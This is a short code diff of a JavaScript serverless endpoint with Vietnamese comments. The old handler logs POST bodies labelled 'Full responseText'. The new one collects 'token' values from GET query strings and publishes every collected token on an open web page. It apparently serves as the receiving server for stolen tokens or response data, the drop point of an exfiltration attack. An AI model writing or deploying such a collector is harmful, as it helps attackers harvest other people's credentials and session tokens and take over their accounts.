@@ -1,15 +1,23 @@
-export default async function handler(req, res) {
-  if (req.method === "POST") {
-    try {
-      const body = await req.text(); 
-      console.log("[+] Full responseText:", body);
-      res.status(200).send("Logged!");
-    } catch (error) {
-      console.error("[-] Error reading body:", error);
-      res.status(500).send("Internal Server Error");
+let logs = []; // lưu logs tạm trong bộ nhớ server (mỗi lần deploy reset)
+
+export default function handler(req, res) {
+  if (req.method === 'GET') {
+    const { token } = req.query;
+
+    if (token) {
+      logs.push({ token, time: new Date().toISOString() });
+      console.log(`[+] Token received: ${token}`);
     }
+
+    // Hiển thị logs ra web
+    res.setHeader('Content-Type', 'text/html; charset=utf-8');
+    const html = `
+      <h1>Logged Tokens</h1>
+      <pre>${JSON.stringify(logs, null, 2)}</pre>
+    `;
+    res.status(200).send(html);
   } else {
-    res.setHeader("Allow", ["POST"]);
-    res.status(405).send("Method Not Allowed");
+    res.setHeader('Allow', ['GET']);
+    res.status(405).send('Method Not Allowed');
   }
 }
